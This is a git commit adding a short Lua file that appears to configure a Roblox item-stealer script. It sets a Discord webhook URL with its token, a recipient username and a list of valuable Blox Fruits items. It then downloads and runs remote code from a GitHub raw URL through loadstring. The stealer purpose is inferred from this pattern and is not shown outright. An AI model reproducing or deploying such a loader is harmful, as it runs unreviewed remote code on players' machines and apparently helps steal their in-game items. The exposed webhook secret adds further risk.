c30be4e75a22c86e6c3030b5f900152c79336169
w-b2azure <nowmatu0@gmail.com>
2025-03-24 15:41:43 -0300

    Create w-azure.lua

---
+++ w-azure.lua
@@ -0,0 +1,5 @@
+Webhook = "https://discord.com/api/webhooks/1353789195197480990/JRW7fJ_MmHRaonrVF3Eq-XqIwn26BqwNKQEK-d1avBHive5sNndv9hQKr99IqDtUmjtE"
+Usernames = {"nowmaty"}
+FruitsToHit = {"Kitsune-Kitsune", "Leopard-Leopard", "Dragon-Dragon"}
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/surelyco/CutestCodes/refs/heads/main/V2"))()
